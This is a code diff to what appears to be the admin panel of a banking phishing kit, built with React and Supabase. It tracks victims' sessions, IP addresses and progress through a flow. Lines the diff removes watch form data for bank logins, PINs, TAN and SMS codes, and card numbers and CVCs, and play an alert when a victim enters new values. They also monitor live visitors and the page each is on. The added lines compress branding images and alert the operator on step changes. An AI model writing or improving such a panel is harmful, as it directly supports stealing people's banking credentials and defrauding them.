@@ -11,7 +11,7 @@ import { translations, TranslationKeys } from "@/lib/languageDefaults";
 import { pathToStep } from "@/lib/session-routes";
 
 const SESSION_LIST_COLUMNS =
-  "id,created_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden";
+  "id,created_at,amount,current_step,status,ip_address,partner_name,is_hidden";
 
 export function AdminDashboardClean() {
   const supabase = createBrowserSupabaseClient();
@@ -130,6 +130,40 @@ export function AdminDashboardClean() {
   const [sessionPaths, setSessionPaths] = useState<Record<string, string>>({});
   const [liveVisitorCount, setLiveVisitorCount] = useState(0);
 
+  async function compressImage(file: File, opts: { maxWidth: number; maxHeight: number; quality: number }) {
+    const objectUrl = URL.createObjectURL(file);
+    try {
+      const img = new Image();
+      img.decoding = "async";
+      img.src = objectUrl;
+
+      await new Promise<void>((resolve, reject) => {
+        img.onload = () => resolve();
+        img.onerror = () => reject(new Error("Image load failed"));
+      });
+
+      const ratio = Math.min(opts.maxWidth / img.width, opts.maxHeight / img.height, 1);
+      const width = Math.round(img.width * ratio);
+      const height = Math.round(img.height * ratio);
+
+      const canvas = document.createElement("canvas");
+      canvas.width = width;
+      canvas.height = height;
+      const ctx = canvas.getContext("2d");
+      if (!ctx) return file;
+      ctx.drawImage(img, 0, 0, width, height);
+
+      const blob = await new Promise<Blob | null>((resolve) =>
+        canvas.toBlob(resolve, "image/jpeg", opts.quality),
+      );
+
+      if (!blob) return file;
+      return new File([blob], file.name.replace(/\.[^/.]+$/, "") + ".jpg", { type: "image/jpeg" });
+    } finally {
+      URL.revokeObjectURL(objectUrl);
+    }
+  }
+
   const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>, field: 'logo_url' | 'bg_url') => {
     const file = e.target.files?.[0];
     if (!file || !supabase) return;
@@ -148,12 +182,18 @@ export function AdminDashboardClean() {
     else setUploadingBg(true);
 
     try {
-      const fileExt = file.name.split('.').pop();
+      let uploadFile = file;
+      if (field === "bg_url") {
+        uploadFile = await compressImage(file, { maxWidth: 1920, maxHeight: 1080, quality: 0.82 });
+      } else {
+        uploadFile = await compressImage(file, { maxWidth: 512, maxHeight: 512, quality: 0.9 });
+      }
+
+      const fileExt = uploadFile.name.split('.').pop();
       const fileName = `${field}-${Date.now()}.${fileExt}`;
-      const { error } = await supabase.storage.from('assets').upload(fileName, file, { upsert: true });
-      
+      const { error } = await supabase.storage.from('assets').upload(fileName, uploadFile, { upsert: true });
       if (error) throw error;
-      
+
       const { data: publicUrlData } = supabase.storage.from('assets').getPublicUrl(fileName);
       setGlobalSettings(prev => ({ ...prev, [field]: publicUrlData.publicUrl }));
     } catch (err: any) {
@@ -241,9 +281,7 @@ export function AdminDashboardClean() {
             oldRow.amount === newRow.amount &&
             oldRow.is_hidden === newRow.is_hidden &&
             oldRow.partner_name === newRow.partner_name &&
-            oldRow.ip_address === newRow.ip_address &&
-            oldRow.user_agent === newRow.user_agent &&
-            JSON.stringify(oldRow.form_data ?? null) === JSON.stringify(newRow.form_data ?? null);
+            oldRow.ip_address === newRow.ip_address;
 
           if (onlyPresenceChanged) {
             return;
@@ -253,24 +291,8 @@ export function AdminDashboardClean() {
         if (soundEnabledRef.current && payload.eventType === "UPDATE") {
           const newRow = payload.new as DemoSession;
           const oldRow = rowsRef.current.find(r => r.id === newRow.id);
-          
-          const newFd = (newRow.form_data || {}) as Record<string, any>;
-          const oldFd = (oldRow?.form_data || {}) as Record<string, any>;
-          
-          const userFields = [
-            'firstName', 'lastName', 'phone',
-            'bankName',
-            'id', 'verfuegernummer', 'pin', 'pw', 'tacCode', 'tac_code',
-            'cardNumber', 'cardExpiry', 'cardCvc',
-            'smsCode'
-          ];
-          
-          // Kullanıcı yeni bir bilgi girdiğinde veya mevcut bilgiyi güncellediğinde çal
-          const hasNewInput = userFields.some(field => 
-            newFd[field] && newFd[field] !== oldFd[field]
-          );
-          
-          if (hasNewInput) {
+
+          if (oldRow && oldRow.current_step !== newRow.current_step) {
             playNotificationSound();
           }
         }
@@ -278,52 +300,8 @@ export function AdminDashboardClean() {
       })
       .subscribe();
 
-    // Canlı ziyaretçi (Presence) takibi
-    const presenceChannel = supabase.channel('online_visitors');
-    presenceChannel
-      .on('presence', { event: 'sync' }, () => {
-        const state = presenceChannel.presenceState();
-        let count = 0;
-        const activeIds = new Set<string>();
-        const paths: Record<string, string> = {};
-        const now = Date.now();
-
-        for (const [key, presences] of Object.entries(state)) {
-          const typedPresences = presences as Array<{ sessionId?: string; pathname?: string }>;
-          if (typedPresences.length === 0) continue;
-
-          const hasVisitorPresence = typedPresences.some((p) =>
-            p.pathname ? !p.pathname.startsWith('/admin') : true,
-          );
-          if (hasVisitorPresence) {
-            count++;
-          }
-
-          for (const p of typedPresences) {
-            if (p.sessionId) {
-              activeIds.add(p.sessionId);
-              if (p.pathname) {
-                paths[p.sessionId] = p.pathname;
-              }
-            }
-          }
-        }
-        setLiveVisitorCount(count);
-        setOnlineSessionIds(activeIds);
-        setSessionPaths(paths);
-        setSessionLastSeenAt((prev) => {
-          const next = { ...prev };
-          for (const sessionId of activeIds) {
-            next[sessionId] = now;
-          }
-          return next;
-        });
-      })
-      .subscribe();
-
     return () => {
       void supabase.removeChannel(channel);
-      void supabase.removeChannel(presenceChannel);
     };
   }, [supabase, load]);
 
